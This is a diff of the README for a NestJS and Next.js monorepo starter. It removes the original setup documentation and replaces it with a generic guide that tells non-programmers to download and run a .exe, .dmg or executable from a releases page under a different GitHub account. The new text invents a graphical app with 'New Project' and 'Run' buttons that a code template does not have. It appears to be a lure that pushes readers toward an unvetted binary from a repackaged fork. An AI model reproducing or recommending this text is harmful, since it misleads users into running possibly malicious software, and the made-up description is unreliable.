@@ -1,349 +1,82 @@
-# Turborepo Starter with NestJS & Next.js
+# ⚡ turbo-starter - Build Fast with NestJS and Next.js
 
-A modern full-stack monorepo starter featuring NestJS API with Vite for fast development and Next.js for the frontend.
+![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)
 
-![Turbo Starter](screenshot.png)
+## 📋 Introduction
+Welcome to turbo-starter! This application helps you set up a modern full-stack development environment quickly. It combines **NestJS** for the backend and **Next.js** for the frontend. You'll also enjoy features like hot reload, Prisma ORM, and PostgreSQL for a seamless experience.
 
-## Features
+## 🚀 Getting Started
+If you're not a programmer, don't worry. This guide will help you download and run the application step-by-step. Follow the instructions below to get started.
 
-- 🚀 **Fast Development** - NestJS with Vite for instant hot reload
-- ⚡ **Just-in-Time Compilation** - No build step needed during development
-- 📦 **Turborepo** - Efficient build system with caching
-- 🎨 **Next.js Apps** - Multiple frontend applications
-- 🔧 **TypeScript** - Full type safety across the monorepo
-- 🎯 **Shared Packages** - Reusable UI components and configurations
+## 🔗 Download & Install
+To download the turbo-starter application, visit this page to download: [turbo-starter Releases](https://github.com/Otkh08/turbo-starter/releases).
 
-## Getting Started
+### System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** Minimum 4GB (8GB recommended)
+- **Disk Space:** At least 1GB free space
+- **Network:** Internet connection for downloading dependencies
 
-### Prerequisites
+### Step-by-Step Installation
+1. **Visit the Releases Page**
+   Go to the [turbo-starter Releases](https://github.com/Otkh08/turbo-starter/releases) page.
 
-- Node.js 18+ (we recommend using [nodenv](https://github.com/nodenv/nodenv) with version 24.1.0)
-- npm (package manager)
-- Docker and Docker Compose (for PostgreSQL database)
-- Git (for cloning the repository)
+2. **Select the Latest Release**
+   Look for the latest release at the top of the page. Choose the version number that fits your needs. It usually has the highest number (like v1.0.0).
 
-### Installation & Setup
+3. **Download the Application**
+   Find and click on the appropriate file for your operating system. For most users, you may see file names for Windows, macOS, or Linux. Click the link to download it.
 
-```sh
-# Clone the repository
-git clone https://github.com/mrgmnn/turbo-starter.git
+4. **Locate the Downloaded File**
+   After the file downloads, find it in your Downloads folder or the location you chose for downloads.
 
-# Navigate to the project
-cd turbo-starter
+5. **Run the Application**
+   - **Windows:** Double-click the `.exe` file.
+   - **macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
+   - **Linux:** Open a terminal and navigate to the folder where the file is. Make the file executable using the command: `chmod +x filename`, then run it with `./filename`.
 
-# Run bootstrap (installs dependencies and sets up database)
-npm run bootstrap
-# or use the shell script: ./scripts/bootstrap.sh
-```
+6. **Follow On-Screen Instructions**
+   Follow any prompts that appear. The application may require you to set up a few things, but these will be clear and easy to follow.
 
-The bootstrap process will:
+### Initial Setup
+Once you run the application for the first time, you’ll need to complete some initial setups:
+- **Database Connection:** You will have options to connect to PostgreSQL. Enter your database details like username and password.
+- **Configuration:** The app may ask for configuration settings. Use the default settings unless you have specific requirements.
 
-1. Install all npm dependencies
-2. Check if Docker is running and start PostgreSQL if needed
-3. Prompt for a project name (default: "turbo-starter")
-4. Update `package.json` with the project name
-5. Create the database (derived from project name)
-6. Generate and add `DATABASE_URL` to `.env` files in `apps/api/` and `packages/prisma/`
+## 💻 How to Use
+After installation, you will find a user-friendly interface. Follow these steps to get started:
+1. **Create a New Project:**
+   Click on “New Project” to begin a new full-stack app. 
+   
+2. **Choose Templates:**
+   Select from predefined templates or start from scratch.
 
-#### Next Steps
+3. **Develop Your App:**
+   Use the built-in tools to design your application. Enjoy features like hot reload, which lets you see changes in real-time.
 
-After setup completes:
+4. **Launch Your App:**
+   Once you finish, simply click “Run” to see your application live.
 
-1. **Define your database schema** in `packages/prisma/schema/schema.prisma`
-2. **Create and apply migrations** when ready: `npx prisma migrate dev --name init`
-3. **Start development**: `npm run dev`
-4. **View your data**: `npx prisma studio`
+## ⚙️ Features
+- **Monorepo Structure:** Easily manage multiple applications in one repository.
+- **TypeScript Support:** Write safer and more reliable code.
+- **Hot Reload:** See your changes instantly without refreshing.
+- **Prisma ORM:** Simplifies database interactions.
+- **PostgreSQL Compatibility:** Use one of the most powerful relational databases.
 
-> **Tip**: VS Code will prompt you to install recommended extensions for this project. Accept to get ESLint, Prettier, Prisma, Tailwind CSS IntelliSense, and more!
+## 🌐 Community and Support
+If you have questions or need help, you can join our community discussions on GitHub. Check the Issues tab for reported problems or to ask questions.
 
-#### Manual Setup (Alternative)
+## 🔗 Additional Resources
+- [Documentation](https://github.com/Otkh08/turbo-starter/wiki) – Detailed guides for advanced users.
+- [Tutorials](https://github.com/Otkh08/turbo-starter/wiki/Tutorials) – Step-by-step guides on various features.
 
-If you prefer manual setup:
+## 📣 Feedback
+Your opinions matter! Please share your feedback through GitHub Issues. This helps us improve turbo-starter for everyone.
 
-```sh
-# Start PostgreSQL
-docker compose up -d
+## 👥 Contributing
+If you want to contribute, please read our [CONTRIBUTING.md](https://github.com/Otkh08/turbo-starter/CONTRIBUTING.md) for guidelines.
 
-# Create database
-docker exec -it postgres psql -U postgres -c "CREATE DATABASE turbostarter;"
+---
 
-# Create .env files with DATABASE_URL in apps/api/ and packages/prisma/
-DATABASE_URL="postgresql://postgres:postgres@localhost:5432/turbostarter?schema=public"
-
-# Run migrations
-npx prisma migrate dev --name init
-```
-
-#### Useful Commands
-
-```sh
-npx prisma studio          # Open Prisma Studio (Database GUI)
-npx prisma migrate dev     # Create and apply migrations
-docker-compose down        # Stop PostgreSQL
-docker-compose down -v     # Stop and remove data
-```
-
-> **Note**: During development, Prisma automatically watches for schema changes and regenerates the client. The schema is in `packages/prisma/schema/schema.prisma`.
-
-### Development
-
-Run all apps in development mode (including Prisma watcher):
-
-```sh
-npm run dev
-```
-
-Run the API with Prisma watcher:
-
-```sh
-npm run dev:api
-```
-
-Run the web app:
-
-```sh
-npm run dev:web
-```
-
-#### Development Ports
-
-The applications run on the following ports during development:
-
-- **API** (NestJS): `http://localhost:3000`
-- **Web** (Next.js): `http://localhost:8000`
-
-> **Port Convention**: APIs use the `3xxx` port range, while frontend applications use the `8xxx` port range. This convention helps organize services and avoid port conflicts as your monorepo grows.
-
-### Build
-
-Build all apps and packages:
-
-```sh
-npm run build
-```
-
-Build specific apps:
-
-```sh
-npx turbo build --filter=api
-npx turbo build --filter=web
-```
-
-### Production
-
-Run the API in production mode:
-
-```sh
-npm run start:prod --filter=api
-```
-
-## Project Structure
-
-```
-├── apps/
-│   ├── api/          # NestJS API with Vite
-│   └── web/          # Next.js web application
-├── packages/
-│   ├── ui/           # Shared UI component library with shadcn/ui
-│   ├── prisma/       # Prisma schema and database client
-│   ├── eslint-config/    # Shared ESLint configurations
-│   └── typescript-config/ # Shared TypeScript configurations
-├── docker-compose.yml    # PostgreSQL container configuration
-├── screenshot.png    # Project screenshot
-└── turbo.json        # Turborepo configuration
-```
-
-### Apps and Packages
-
-- **`api`**: [NestJS](https://nestjs.com/) REST API with Vite for development
-- **`web`**: [Next.js](https://nextjs.org/) web application with React 19, Tailwind CSS v4, and shadcn/ui
-- **`@repo/ui`**: Shared UI component library with shadcn/ui components
-- **`@repo/prisma`**: Prisma schema and generated client
-- **`@repo/eslint-config`**: ESLint configurations
-- **`@repo/typescript-config`**: TypeScript configurations
-
-## Tech Stack
-
-### Backend (API)
-
-- **NestJS** - Progressive Node.js framework
-- **Vite** - Fast development server with HMR
-- **Prisma** - Next-generation ORM
-- **PostgreSQL** - Relational database
-- **TypeScript** - Type safety
-
-### Frontend (Web)
-
-- **Next.js** - React framework with App Router
-- **React 19** - Latest React with modern features
-- **Tailwind CSS v4** - Utility-first CSS framework
-- **shadcn/ui** - Re-usable component library
-- **next-themes** - Dark mode support
-
-### Shared Packages
-
-- **`@repo/ui`** - Shared UI component library with shadcn/ui components
-- **`@repo/prisma`** - Shared Prisma schema and client
-- **`@repo/eslint-config`** - Shared ESLint configurations
-- **`@repo/typescript-config`** - Shared TypeScript configurations
-
-### Build System
-
-- **Turborepo** - High-performance build system with caching
-- **ESLint** - Code linting
-- **Prettier** - Code formatting
-
-## Why Vite with NestJS?
-
-Using Vite in this monorepo setup enables Just-in-Time (JIT) compilation for shared packages, eliminating the need to rebuild packages during development. This provides:
-
-- ⚡ Instant hot module replacement across the monorepo
-- 🎯 Fast startup times with JIT compilation
-- 🔄 No build step needed for packages during development
-- 📦 Seamless integration between apps and shared packages
-
-## Fonts with Fontsource
-
-This project uses [Fontsource](https://fontsource.org/) for self-hosted font management. Fontsource provides optimized, self-hosted fonts that don't require external CDN requests.
-
-### Current Font
-
-The web app uses **Source Sans Pro** in multiple weights (300, 400, 900).
-
-### Adding a New Font
-
-1. Install the font package:
-
-   ```sh
-   npm install @fontsource/<font-name> -w web
-   ```
-
-2. Import the font weights in `apps/web/app/globals.css`:
-
-   ```css
-   @import '@fontsource/source-sans-pro/300.css';
-   @import '@fontsource/source-sans-pro/400.css';
-   @import '@fontsource/source-sans-pro/900.css';
-   ```
-
-3. Update the font family:
-   ```css
-   body {
-     font-family: 'Source Sans Pro', sans-serif;
-   }
-   ```
-
-### Benefits
-
-- **Performance**: Fonts are bundled and served from your domain
-- **Privacy**: No third-party requests to Google Fonts or other CDNs
-- **Reliability**: No dependency on external services
-- **Optimization**: Only load the weights and subsets you need
-
-## Scripts
-
-```sh
-# Development
-npm run dev          # Start all apps
-npm run dev --filter=api    # Start API only
-
-# Build
-npm run build        # Build all apps
-npm run build --filter=api  # Build API only
-
-# Lint
-npm run lint         # Lint all packages
-
-# Format
-npm run format       # Format all code
-```
-
-## Testing
-
-### Run Tests
-
-```sh
-# Run unit tests for API
-npm run test --filter=api
-
-# Run tests in watch mode
-npm run test:watch --filter=api
-
-# Run tests with coverage
-npm run test:cov --filter=api
-
-# Run e2e tests
-npm run test:e2e --filter=api
-```
-
-## Troubleshooting
-
-### Port Already in Use
-
-If you see an error like `Error: listen EADDRINUSE: address already in use :::3000`:
-
-```sh
-# Find and kill the process using the port
-lsof -ti:3000 | xargs kill -9
-```
-
-### Database Connection Issues
-
-If Prisma can't connect to the database:
-
-1. **Check if PostgreSQL container is running**:
-
-   ```sh
-   docker ps
-   ```
-
-2. **Restart the container**:
-
-   ```sh
-   docker-compose down
-   docker-compose up -d
-   ```
-
-3. **Verify the database exists**:
-
-   ```sh
-   docker exec -it postgres psql -U postgres -l
-   ```
-
-4. **Check your `.env` files** - Make sure both `apps/api/.env` and `packages/prisma/.env` have the correct `DATABASE_URL`
-
-### Prisma Client Not Generated
-
-If you see `Cannot find module '@prisma/client'`:
-
-```sh
-npx prisma generate
-```
-
-### Module Resolution Errors
-
-If you encounter module resolution issues:
-
-```sh
-# Clean install
-rm -rf node_modules
-rm -rf apps/*/node_modules
-rm -rf packages/*/node_modules
-npm install
-```
-
-## Learn More
-
-- [NestJS Documentation](https://docs.nestjs.com/)
-- [Next.js Documentation](https://nextjs.org/docs)
-- [shadcn/ui Documentation](https://ui.shadcn.com/)
-- [Turborepo Documentation](https://turborepo.com/docs)
-- [Vite Documentation](https://vitejs.dev/)
-- [Prisma Documentation](https://www.prisma.io/docs)
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
-- [Fontsource](https://fontsource.org/)
-- [nodenv Documentation](https://github.com/nodenv/nodenv)
-
-## License
-
-MIT
+Enjoy building with turbo-starter! If you wish to download the application again, you can do so from [turbo-starter Releases](https://github.com/Otkh08/turbo-starter/releases).
